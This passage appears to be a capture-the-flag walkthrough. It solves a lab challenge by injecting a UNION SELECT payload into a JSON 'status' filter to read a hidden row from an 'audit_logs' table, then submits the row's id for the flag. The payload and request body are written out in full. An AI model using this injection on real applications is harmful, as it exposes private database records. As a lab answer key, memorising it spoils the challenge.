`reports` selects three columns: `id (int), title (text), status (text)`.
`audit_logs` is `id (int), action (text), detail (text)` — a matching three.

Send this as your `status` value:

```
zzz' UNION SELECT id, action, detail FROM audit_logs WHERE action = 'FLAG_ISSUE' --
```

i.e. the full request body:

```json
{
  "filter": {
    "status": "zzz' UNION SELECT id, action, detail FROM audit_logs WHERE action = 'FLAG_ISSUE' -- "
  }
}
```

A UNION keeps the first SELECT's column names, so the audit row comes back as
`{"id": <number>, "title": "FLAG_ISSUE", "status": "..."}`. Read that integer
`id` — it is different on every instance — and submit it:

```json
POST /solve   {"id": <that number>}
```

You'll get `{"flag":"FLAG{...}"}`.
